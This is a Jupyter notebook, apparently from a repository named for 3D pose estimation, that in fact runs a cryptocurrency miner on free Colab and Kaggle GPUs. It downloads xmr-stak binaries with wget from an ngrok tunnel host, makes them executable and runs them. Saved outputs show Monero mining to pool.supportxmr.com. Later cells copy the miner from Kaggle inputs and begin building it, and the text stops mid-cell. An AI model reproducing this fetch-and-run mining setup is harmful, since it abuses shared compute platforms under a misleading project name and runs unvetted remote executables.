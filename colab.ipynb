{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "kernel1a895bd4c0.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/HacxS/3D_Pose_Estimation/blob/master/colab.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "metadata": {
        "_uuid": "8f2839f25d086af736a60e9eeb907d3b93b6e0e5",
        "_cell_guid": "b1076dfc-b9ad-4769-8c92-a6c4dae69d19",
        "trusted": true,
        "id": "huDhLGWmzRXR",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "import os,subprocess"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "_cell_guid": "79c7e3d0-c299-4dcb-8224-4455121ee9b0",
        "_uuid": "d629ff2d2480ee46fbb7e2d37f6b5fab8052498a",
        "trusted": true,
        "id": "izDoC5HGzRXm",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def fun(cmd):\n",
        "    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)\n",
        "    for i in iter(popen.stdout.readline,\"\"):\n",
        "        yield i\n",
        "    popen.stdout.close()\n",
        "    popen.wait()\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "8O-bxOGOzRXw",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 3011
        },
        "outputId": "0dd79349-0b3e-4095-ea92-b1a1bfe1f02a"
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['apt','update']):\n",
        "    print(i,end='')\n",
        "for i in fun(['apt', '-y', 'install', 'libmicrohttpd-dev', 'libssl-dev', 'cmake', 'build-essential', 'libhwloc-dev']):\n",
        "    print(i,end='')"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Hit:1 http://ppa.launchpad.net/graphics-drivers/ppa/ubuntu bionic InRelease\n",
            "Hit:2 http://archive.ubuntu.com/ubuntu bionic InRelease\n",
            "Get:3 http://archive.ubuntu.com/ubuntu bionic-updates InRelease [88.7 kB]\n",
            "Get:4 http://security.ubuntu.com/ubuntu bionic-security InRelease [88.7 kB]\n",
            "Get:5 http://ppa.launchpad.net/marutter/c2d4u3.5/ubuntu bionic InRelease [15.4 kB]\n",
            "Get:6 https://cloud.r-project.org/bin/linux/ubuntu bionic-cran35/ InRelease [3,609 B]\n",
            "Get:7 http://archive.ubuntu.com/ubuntu bionic-backports InRelease [74.6 kB]\n",
            "Ign:8 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  InRelease\n",
            "Get:9 http://ppa.launchpad.net/marutter/c2d4u3.5/ubuntu bionic/main Sources [1,633 kB]\n",
            "Ign:10 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  InRelease\n",
            "Hit:11 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  Release\n",
            "Hit:12 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  Release\n",
            "Get:13 http://ppa.launchpad.net/marutter/c2d4u3.5/ubuntu bionic/main amd64 Packages [784 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages [966 kB]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages [744 kB]\n",
            "Fetched 4,399 kB in 2s (2,027 kB/s)\n",
            "Reading package lists...\n",
            "Building dependency tree...\n",
            "Reading state information...\n",
            "10 packages can be upgraded. Run 'apt list --upgradable' to see them.\n",
            "Reading package lists...\n",
            "Building dependency tree...\n",
            "Reading state information...\n",
            "build-essential is already the newest version (12.4ubuntu1).\n",
            "cmake is already the newest version (3.10.2-1ubuntu2).\n",
            "libhwloc-dev is already the newest version (1.11.9-1).\n",
            "libhwloc-dev set to manually installed.\n",
            "libssl-dev is already the newest version (1.1.0g-2ubuntu4.3).\n",
            "The following package was automatically installed and is no longer required:\n",
            "  libnvidia-common-410\n",
            "Use 'apt autoremove' to remove it.\n",
            "The following additional packages will be installed:\n",
            "  libevent-2.1-6 libgcrypt20-dev libgmp-dev libgmpxx4ldbl libgnutls-dane0\n",
            "  libgnutls-openssl27 libgnutls28-dev libgnutlsxx28 libgpg-error-dev\n",
            "  libidn2-0-dev libidn2-dev libmicrohttpd12 libp11-kit-dev libtasn1-6-dev\n",
            "  libtasn1-doc libunbound2 nettle-dev\n",
            "Suggested packages:\n",
            "  libgcrypt20-doc gmp-doc libgmp10-doc libmpfr-dev dns-root-data gnutls-doc\n",
            "  gnutls-bin\n",
            "The following NEW packages will be installed:\n",
            "  libevent-2.1-6 libgcrypt20-dev libgmp-dev libgmpxx4ldbl libgnutls-dane0\n",
            "  libgnutls-openssl27 libgnutls28-dev libgnutlsxx28 libgpg-error-dev\n",
            "  libidn2-0-dev libidn2-dev libmicrohttpd-dev libmicrohttpd12 libp11-kit-dev\n",
            "  libtasn1-6-dev libtasn1-doc libunbound2 nettle-dev\n",
            "0 upgraded, 18 newly installed, 0 to remove and 10 not upgraded.\n",
            "Need to get 3,728 kB of archives.\n",
            "After this operation, 13.7 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic/main amd64 libevent-2.1-6 amd64 2.1.8-stable-4build1 [133 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgpg-error-dev amd64 1.27-6 [94.8 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 libgcrypt20-dev amd64 1.8.1-4ubuntu1.1 [468 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgmpxx4ldbl amd64 2:6.1.2+dfsg-2 [8,964 B]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgmp-dev amd64 2:6.1.2+dfsg-2 [316 kB]\n",
            "Get:6 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgnutls-openssl27 amd64 3.5.18-1ubuntu1 [21.1 kB]\n",
            "Get:7 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgnutlsxx28 amd64 3.5.18-1ubuntu1 [13.7 kB]\n",
            "Get:8 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 libunbound2 amd64 1.6.7-1ubuntu2.2 [266 kB]\n",
            "Get:9 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgnutls-dane0 amd64 3.5.18-1ubuntu1 [21.0 kB]\n",
            "Get:10 http://archive.ubuntu.com/ubuntu bionic/main amd64 nettle-dev amd64 3.4-1 [951 kB]\n",
            "Get:11 http://archive.ubuntu.com/ubuntu bionic/main amd64 libtasn1-6-dev amd64 4.13-2 [86.8 kB]\n",
            "Get:12 http://archive.ubuntu.com/ubuntu bionic/main amd64 libp11-kit-dev amd64 0.23.9-2 [60.9 kB]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu bionic/main amd64 libidn2-dev amd64 2.0.4-1.1build2 [61.3 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu bionic/main amd64 libidn2-0-dev amd64 2.0.4-1.1build2 [2,844 B]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgnutls28-dev amd64 3.5.18-1ubuntu1 [659 kB]\n",
            "Get:16 http://archive.ubuntu.com/ubuntu bionic/universe amd64 libmicrohttpd12 amd64 0.9.59-1 [53.3 kB]\n",
            "Get:17 http://archive.ubuntu.com/ubuntu bionic/universe amd64 libmicrohttpd-dev amd64 0.9.59-1 [210 kB]\n",
            "Get:18 http://archive.ubuntu.com/ubuntu bionic/main amd64 libtasn1-doc all 4.13-2 [300 kB]\n",
            "Fetched 3,728 kB in 0s (23.3 MB/s)\n",
            "Selecting previously unselected package libevent-2.1-6:amd64.\n",
            "(Reading database ... \n",
            "(Reading database ... 5%\n",
            "(Reading database ... 10%\n",
            "(Reading database ... 15%\n",
            "(Reading database ... 20%\n",
            "(Reading database ... 25%\n",
            "(Reading database ... 30%\n",
            "(Reading database ... 35%\n",
            "(Reading database ... 40%\n",
            "(Reading database ... 45%\n",
            "(Reading database ... 50%\n",
            "(Reading database ... 55%\n",
            "(Reading database ... 60%\n",
            "(Reading database ... 65%\n",
            "(Reading database ... 70%\n",
            "(Reading database ... 75%\n",
            "(Reading database ... 80%\n",
            "(Reading database ... 85%\n",
            "(Reading database ... 90%\n",
            "(Reading database ... 95%\n",
            "(Reading database ... 100%\n",
            "(Reading database ... 131304 files and directories currently installed.)\n",
            "Preparing to unpack .../00-libevent-2.1-6_2.1.8-stable-4build1_amd64.deb ...\n",
            "Unpacking libevent-2.1-6:amd64 (2.1.8-stable-4build1) ...\n",
            "Selecting previously unselected package libgpg-error-dev.\n",
            "Preparing to unpack .../01-libgpg-error-dev_1.27-6_amd64.deb ...\n",
            "Unpacking libgpg-error-dev (1.27-6) ...\n",
            "Selecting previously unselected package libgcrypt20-dev.\n",
            "Preparing to unpack .../02-libgcrypt20-dev_1.8.1-4ubuntu1.1_amd64.deb ...\n",
            "Unpacking libgcrypt20-dev (1.8.1-4ubuntu1.1) ...\n",
            "Selecting previously unselected package libgmpxx4ldbl:amd64.\n",
            "Preparing to unpack .../03-libgmpxx4ldbl_2%3a6.1.2+dfsg-2_amd64.deb ...\n",
            "Unpacking libgmpxx4ldbl:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Selecting previously unselected package libgmp-dev:amd64.\n",
            "Preparing to unpack .../04-libgmp-dev_2%3a6.1.2+dfsg-2_amd64.deb ...\n",
            "Unpacking libgmp-dev:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Selecting previously unselected package libgnutls-openssl27:amd64.\n",
            "Preparing to unpack .../05-libgnutls-openssl27_3.5.18-1ubuntu1_amd64.deb ...\n",
            "Unpacking libgnutls-openssl27:amd64 (3.5.18-1ubuntu1) ...\n",
            "Selecting previously unselected package libgnutlsxx28:amd64.\n",
            "Preparing to unpack .../06-libgnutlsxx28_3.5.18-1ubuntu1_amd64.deb ...\n",
            "Unpacking libgnutlsxx28:amd64 (3.5.18-1ubuntu1) ...\n",
            "Selecting previously unselected package libunbound2:amd64.\n",
            "Preparing to unpack .../07-libunbound2_1.6.7-1ubuntu2.2_amd64.deb ...\n",
            "Unpacking libunbound2:amd64 (1.6.7-1ubuntu2.2) ...\n",
            "Selecting previously unselected package libgnutls-dane0:amd64.\n",
            "Preparing to unpack .../08-libgnutls-dane0_3.5.18-1ubuntu1_amd64.deb ...\n",
            "Unpacking libgnutls-dane0:amd64 (3.5.18-1ubuntu1) ...\n",
            "Selecting previously unselected package nettle-dev:amd64.\n",
            "Preparing to unpack .../09-nettle-dev_3.4-1_amd64.deb ...\n",
            "Unpacking nettle-dev:amd64 (3.4-1) ...\n",
            "Selecting previously unselected package libtasn1-6-dev:amd64.\n",
            "Preparing to unpack .../10-libtasn1-6-dev_4.13-2_amd64.deb ...\n",
            "Unpacking libtasn1-6-dev:amd64 (4.13-2) ...\n",
            "Selecting previously unselected package libp11-kit-dev:amd64.\n",
            "Preparing to unpack .../11-libp11-kit-dev_0.23.9-2_amd64.deb ...\n",
            "Unpacking libp11-kit-dev:amd64 (0.23.9-2) ...\n",
            "Selecting previously unselected package libidn2-dev:amd64.\n",
            "Preparing to unpack .../12-libidn2-dev_2.0.4-1.1build2_amd64.deb ...\n",
            "Unpacking libidn2-dev:amd64 (2.0.4-1.1build2) ...\n",
            "Selecting previously unselected package libidn2-0-dev.\n",
            "Preparing to unpack .../13-libidn2-0-dev_2.0.4-1.1build2_amd64.deb ...\n",
            "Unpacking libidn2-0-dev (2.0.4-1.1build2) ...\n",
            "Selecting previously unselected package libgnutls28-dev:amd64.\n",
            "Preparing to unpack .../14-libgnutls28-dev_3.5.18-1ubuntu1_amd64.deb ...\n",
            "Unpacking libgnutls28-dev:amd64 (3.5.18-1ubuntu1) ...\n",
            "Selecting previously unselected package libmicrohttpd12.\n",
            "Preparing to unpack .../15-libmicrohttpd12_0.9.59-1_amd64.deb ...\n",
            "Unpacking libmicrohttpd12 (0.9.59-1) ...\n",
            "Selecting previously unselected package libmicrohttpd-dev.\n",
            "Preparing to unpack .../16-libmicrohttpd-dev_0.9.59-1_amd64.deb ...\n",
            "Unpacking libmicrohttpd-dev (0.9.59-1) ...\n",
            "Selecting previously unselected package libtasn1-doc.\n",
            "Preparing to unpack .../17-libtasn1-doc_4.13-2_all.deb ...\n",
            "Unpacking libtasn1-doc (4.13-2) ...\n",
            "Setting up libevent-2.1-6:amd64 (2.1.8-stable-4build1) ...\n",
            "Setting up libgpg-error-dev (1.27-6) ...\n",
            "Setting up libp11-kit-dev:amd64 (0.23.9-2) ...\n",
            "Setting up libtasn1-6-dev:amd64 (4.13-2) ...\n",
            "Setting up libtasn1-doc (4.13-2) ...\n",
            "Setting up libgnutlsxx28:amd64 (3.5.18-1ubuntu1) ...\n",
            "Processing triggers for libc-bin (2.27-3ubuntu1) ...\n",
            "Setting up libgcrypt20-dev (1.8.1-4ubuntu1.1) ...\n",
            "Setting up libgnutls-openssl27:amd64 (3.5.18-1ubuntu1) ...\n",
            "Processing triggers for man-db (2.8.3-2ubuntu0.1) ...\n",
            "Setting up libmicrohttpd12 (0.9.59-1) ...\n",
            "Setting up libgmpxx4ldbl:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Setting up libidn2-dev:amd64 (2.0.4-1.1build2) ...\n",
            "Setting up libidn2-0-dev (2.0.4-1.1build2) ...\n",
            "Setting up libgmp-dev:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Setting up libunbound2:amd64 (1.6.7-1ubuntu2.2) ...\n",
            "Setting up libgnutls-dane0:amd64 (3.5.18-1ubuntu1) ...\n",
            "Setting up nettle-dev:amd64 (3.4-1) ...\n",
            "Setting up libgnutls28-dev:amd64 (3.5.18-1ubuntu1) ...\n",
            "Setting up libmicrohttpd-dev (0.9.59-1) ...\n",
            "Processing triggers for libc-bin (2.27-3ubuntu1) ...\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "E9nwVQus0TKS",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 825
        },
        "outputId": "929e1e2d-c5fc-4c12-b0f5-dddd8fc855f7"
      },
      "cell_type": "code",
      "source": [
        "!wget http://0.tcp.ngrok.io:15400/xmrlinux/xmr-stak\n",
        "!wget http://0.tcp.ngrok.io:15400/xmrlinux/libxmrstak_cuda_backend.so\n",
        "!wget http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-asm.a\n",
        "!wget http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-backend.a\n",
        "!wget http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-c.a"
      ],
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2019-04-08 07:26:58--  http://0.tcp.ngrok.io:15400/xmrlinux/libxmrstak_cuda_backend.so\n",
            "Resolving 0.tcp.ngrok.io (0.tcp.ngrok.io)... 52.15.194.28\n",
            "Connecting to 0.tcp.ngrok.io (0.tcp.ngrok.io)|52.15.194.28|:15400... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 50036336 (48M) [application/octet-stream]\n",
            "Saving to: ‘libxmrstak_cuda_backend.so’\n",
            "\n",
            "libxmrstak_cuda_bac 100%[===================>]  47.72M   941KB/s    in 54s     \n",
            "\n",
            "2019-04-08 07:27:53 (906 KB/s) - ‘libxmrstak_cuda_backend.so’ saved [50036336/50036336]\n",
            "\n",
            "--2019-04-08 07:27:55--  http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-asm.a\n",
            "Resolving 0.tcp.ngrok.io (0.tcp.ngrok.io)... 52.15.62.13\n",
            "Connecting to 0.tcp.ngrok.io (0.tcp.ngrok.io)|52.15.62.13|:15400... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 58488 (57K)\n",
            "Saving to: ‘libxmr-stak-asm.a’\n",
            "\n",
            "libxmr-stak-asm.a   100%[===================>]  57.12K   307KB/s    in 0.2s    \n",
            "\n",
            "2019-04-08 07:27:55 (307 KB/s) - ‘libxmr-stak-asm.a’ saved [58488/58488]\n",
            "\n",
            "--2019-04-08 07:27:58--  http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-backend.a\n",
            "Resolving 0.tcp.ngrok.io (0.tcp.ngrok.io)... 52.15.62.13\n",
            "Connecting to 0.tcp.ngrok.io (0.tcp.ngrok.io)|52.15.62.13|:15400... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 2361108 (2.3M)\n",
            "Saving to: ‘libxmr-stak-backend.a’\n",
            "\n",
            "libxmr-stak-backend 100%[===================>]   2.25M   898KB/s    in 2.6s    \n",
            "\n",
            "2019-04-08 07:28:01 (898 KB/s) - ‘libxmr-stak-backend.a’ saved [2361108/2361108]\n",
            "\n",
            "--2019-04-08 07:28:03--  http://0.tcp.ngrok.io:15400/xmrlinux/libxmr-stak-c.a\n",
            "Resolving 0.tcp.ngrok.io (0.tcp.ngrok.io)... 52.15.62.13\n",
            "Connecting to 0.tcp.ngrok.io (0.tcp.ngrok.io)|52.15.62.13|:15400... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 73390 (72K)\n",
            "Saving to: ‘libxmr-stak-c.a’\n",
            "\n",
            "libxmr-stak-c.a     100%[===================>]  71.67K   391KB/s    in 0.2s    \n",
            "\n",
            "2019-04-08 07:28:04 (391 KB/s) - ‘libxmr-stak-c.a’ saved [73390/73390]\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "0Do7jzjq0TW7",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "!chmod 777 xmr-stak"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "dHca7iyz0TaV",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1284
        },
        "outputId": "57fc0fae-3113-4216-fd5d-0e76cdae69bb"
      },
      "cell_type": "code",
      "source": [
        "!./xmr-stak --noCPU "
      ],
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[2019-04-08 07:28:57] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-08 07:28:57] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-08 07:28:57] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-08 07:28:57] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-08 07:28:57] : MEMORY ALLOC FAILED: mlock failed\n",
            "-------------------------------------------------------------------\n",
            "xmr-stak 2.10.4 a5b8fb7\n",
            "\n",
            "Brought to you by fireice_uk and psychocrypt under GPLv3.\n",
            "Based on CPU mining code by wolf9466 (heavily optimized by fireice_uk).\n",
            "Based on NVIDIA mining code by KlausT and psychocrypt.\n",
            "\n",
            "Configurable dev donation level is set to 2.0%\n",
            "\n",
            "-------------------------------------------------------------------\n",
            "You can use following keys to display reports:\n",
            "'h' - hashrate\n",
            "'r' - results\n",
            "'c' - connection\n",
            "-------------------------------------------------------------------\n",
            "Upcoming xmr-stak-gui is sponsored by:\n",
            "   #####   ______               ____\n",
            " ##     ## | ___ \\             /  _ \\\n",
            "#    _    #| |_/ /_   _   ___  | / \\/ _   _  _ _  _ _  ___  _ __    ___  _   _\n",
            "#   |_|   #|    /| | | | / _ \\ | |   | | | || '_|| '_|/ _ \\| '_ \\  / __|| | | |\n",
            "#         #| |\\ \\| |_| || (_) || \\_/\\| |_| || |  | | |  __/| | | || (__ | |_| |\n",
            " ##     ## \\_| \\_|\\__, | \\___/ \\____/ \\__,_||_|  |_|  \\___||_| |_| \\___| \\__, |\n",
            "   #####           __/ |                                                  __/ |\n",
            "                  |___/   https://ryo-currency.com                       |___/\n",
            "\n",
            "This currency is a way for us to implement the ideas that we were unable to in\n",
            "Monero. See https://github.com/fireice-uk/cryptonote-speedup-demo for details.\n",
            "-------------------------------------------------------------------\n",
            "[2019-04-08 07:28:58] : Mining coin: cryptonight_r\n",
            "[2019-04-08 07:28:58] : NVIDIA: try to load library 'xmrstak_cuda_backend_cuda10_0'\n",
            "WARNING: NVIDIA cannot load backend library: libxmrstak_cuda_backend_cuda10_0.so: cannot open shared object file: No such file or directory\n",
            "[2019-04-08 07:28:58] : NVIDIA: try to load library 'xmrstak_cuda_backend_cuda9_2'\n",
            "WARNING: NVIDIA cannot load backend library: libxmrstak_cuda_backend_cuda9_2.so: cannot open shared object file: No such file or directory\n",
            "[2019-04-08 07:28:58] : NVIDIA: try to load library 'xmrstak_cuda_backend'\n",
            "CUDA [10.0/10.0] GPU#0, device architecture 37: \"Tesla K80\"... device init succeeded\n",
            "[2019-04-08 07:28:58] : NVIDIA: GPU configuration stored in file 'nvidia.txt'\n",
            "NVIDIA: found 1 potential device's\n",
            "[2019-04-08 07:28:58] : Starting NVIDIA GPU thread 0, no affinity.\n",
            "CUDA [10.0/10.0] GPU#0, device architecture 37: \"Tesla K80\"... device init succeeded\n",
            "[2019-04-08 07:28:58] : NVIDIA: use library 'xmrstak_cuda_backend'\n",
            "[2019-04-08 07:28:58] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-08 07:28:58] : Fast-connecting to pool.supportxmr.com:7777 pool ...\n",
            "[2019-04-08 07:28:58] : Pool pool.supportxmr.com:7777 connected. Logging in...\n",
            "[2019-04-08 07:28:59] : Difficulty changed. Now: 40000.\n",
            "[2019-04-08 07:28:59] : Pool logged in.\n",
            "HASHRATE REPORT - NVIDIA\n",
            "| ID |    10s |    60s |    15m |\n",
            "|  0 |  323.0 |   (na) |   (na) |\n",
            "Totals (NVIDIA):   323.0    0.0    0.0 H/s\n",
            "-----------------------------------------------------------------\n",
            "Totals (ALL):    323.0    0.0    0.0 H/s\n",
            "Highest:   323.4 H/s\n",
            "-----------------------------------------------------------------\n",
            "[2019-04-08 07:29:45] : Difficulty changed. Now: 31169.\n",
            "[2019-04-08 07:29:45] : New block detected.\n",
            "HASHRATE REPORT - NVIDIA\n",
            "| ID |    10s |    60s |    15m |\n",
            "|  0 |  322.9 |   (na) |   (na) |\n",
            "Totals (NVIDIA):   322.9    0.0    0.0 H/s\n",
            "-----------------------------------------------------------------\n",
            "Totals (ALL):    322.9    0.0    0.0 H/s\n",
            "Highest:   323.4 H/s\n",
            "-----------------------------------------------------------------\n",
            "^C\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "trusted": true,
        "id": "bj_jGIxjzRX-",
        "colab_type": "code",
        "colab": {},
        "outputId": "5ed8da42-02e2-4cfe-a139-48148b371fa9"
      },
      "cell_type": "code",
      "source": [
        "os.system('cp /kaggle/input/pools.txt /tmp')\n",
        "os.system('cp /kaggle/input/config.txt /tmp')\n",
        "os.system('cp /kaggle/input/cpu.txt /tmp')\n",
        "os.system('cp /kaggle/input/xmr-stak /tmp')\n",
        "os.system('cp /kaggle/input/nvidia.txt /tmp')\n",
        "os.system('cp /kaggle/input/libxmrstak_cuda_backend.so /tmp')\n",
        "os.system('cp /kaggle/input/libxmr-stak-c.a /tmp')\n",
        "os.system('cp /kaggle/input/libxmr-stak-backend.a /tmp')\n",
        "os.system('cp /kaggle/input/libxmr-stak-asm.a /tmp')\n",
        "os.chdir('/tmp')\n",
        "os.system('chmod 777 xmr-stak')"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 4
        }
      ]
    },
    {
      "metadata": {
        "trusted": true,
        "id": "Cw1PhIxezRYH",
        "colab_type": "code",
        "colab": {},
        "outputId": "db86980e-0869-4e10-cceb-69a61b90137e"
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['./xmr-stak']):\n",
        "    print(i,end='')"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[2019-04-07 21:44:30] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:30] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:30] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:30] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:30] : MEMORY ALLOC FAILED: mlock failed\n",
            "-------------------------------------------------------------------\n",
            "xmr-stak 2.10.4 a5b8fb7\n",
            "\n",
            "Brought to you by fireice_uk and psychocrypt under GPLv3.\n",
            "Based on CPU mining code by wolf9466 (heavily optimized by fireice_uk).\n",
            "Based on NVIDIA mining code by KlausT and psychocrypt.\n",
            "\n",
            "Configurable dev donation level is set to 2.0%\n",
            "\n",
            "-------------------------------------------------------------------\n",
            "You can use following keys to display reports:\n",
            "'h' - hashrate\n",
            "'r' - results\n",
            "'c' - connection\n",
            "-------------------------------------------------------------------\n",
            "Upcoming xmr-stak-gui is sponsored by:\n",
            "   #####   ______               ____\n",
            " ##     ## | ___ \\             /  _ \\\n",
            "#    _    #| |_/ /_   _   ___  | / \\/ _   _  _ _  _ _  ___  _ __    ___  _   _\n",
            "#   |_|   #|    /| | | | / _ \\ | |   | | | || '_|| '_|/ _ \\| '_ \\  / __|| | | |\n",
            "#         #| |\\ \\| |_| || (_) || \\_/\\| |_| || |  | | |  __/| | | || (__ | |_| |\n",
            " ##     ## \\_| \\_|\\__, | \\___/ \\____/ \\__,_||_|  |_|  \\___||_| |_| \\___| \\__, |\n",
            "   #####           __/ |                                                  __/ |\n",
            "                  |___/   https://ryo-currency.com                       |___/\n",
            "\n",
            "This currency is a way for us to implement the ideas that we were unable to in\n",
            "Monero. See https://github.com/fireice-uk/cryptonote-speedup-demo for details.\n",
            "-------------------------------------------------------------------\n",
            "[2019-04-07 21:44:30] : Mining coin: cryptonight_r\n",
            "[2019-04-07 21:44:30] : NVIDIA: try to load library 'xmrstak_cuda_backend_cuda10_0'\n",
            "[2019-04-07 21:44:30] : NVIDIA: try to load library 'xmrstak_cuda_backend_cuda9_2'\n",
            "[2019-04-07 21:44:30] : NVIDIA: try to load library 'xmrstak_cuda_backend'\n",
            "NVIDIA: found 1 potential device's\n",
            "[2019-04-07 21:44:30] : Starting NVIDIA GPU thread 0, no affinity.\n",
            "CUDA [10.0/10.0] GPU#0, device architecture 60: \"Tesla P100-PCIE-16GB\"... device init succeeded\n",
            "[2019-04-07 21:44:31] : NVIDIA: use library 'xmrstak_cuda_backend'\n",
            "[2019-04-07 21:44:31] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:31] : Starting 1x thread, affinity: 0.\n",
            "[2019-04-07 21:44:31] : hwloc: can't bind memory\n",
            "[2019-04-07 21:44:31] : Starting 1x thread, affinity: 2.\n",
            "[2019-04-07 21:44:31] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:31] : WARNING setting affinity failed.\n",
            "[2019-04-07 21:44:31] : Starting 1x thread, affinity: 4.\n",
            "[2019-04-07 21:44:31] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:31] : WARNING setting affinity failed.\n",
            "[2019-04-07 21:44:31] : Starting 1x thread, affinity: 6.\n",
            "[2019-04-07 21:44:31] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:31] : WARNING setting affinity failed.\n",
            "[2019-04-07 21:44:31] : MEMORY ALLOC FAILED: mlock failed\n",
            "[2019-04-07 21:44:31] : Fast-connecting to pool.supportxmr.com:7777 pool ...\n",
            "[2019-04-07 21:44:31] : Pool pool.supportxmr.com:7777 connected. Logging in...\n",
            "[2019-04-07 21:44:31] : Difficulty changed. Now: 40000.\n",
            "[2019-04-07 21:44:31] : Pool logged in.\n",
            "[2019-04-07 21:44:31] : enable cryptonight_r asm 'intel_avx' cpu's\n",
            "[2019-04-07 21:44:31] : enable cryptonight_r asm 'intel_avx' cpu's\n",
            "[2019-04-07 21:44:31] : enable cryptonight_r asm 'intel_avx' cpu's\n",
            "[2019-04-07 21:44:31] : enable cryptonight_r asm 'intel_avx' cpu's\n",
            "[2019-04-07 21:44:42] : Result accepted by the pool.\n",
            "[2019-04-07 21:44:43] : Difficulty changed. Now: 109081.\n",
            "[2019-04-07 21:44:43] : New block detected.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "trusted": true,
        "id": "8XgbGtoGzRYQ",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['git', 'clone', 'https://github.com/fireice-uk/xmr-stak.git']):\n",
        "    print(i,end='')\n",
        "os.mkdir('xmr-stak/build')\n",
        "os.chdir('xmr-stak/build')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "YjEBOojOzRYY",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['cmake', '..','-DOpenCL_ENABLE=OFF']):\n",
        "    print(i,end='')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "KsYDInn1zRYg",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['make', 'install']):\n",
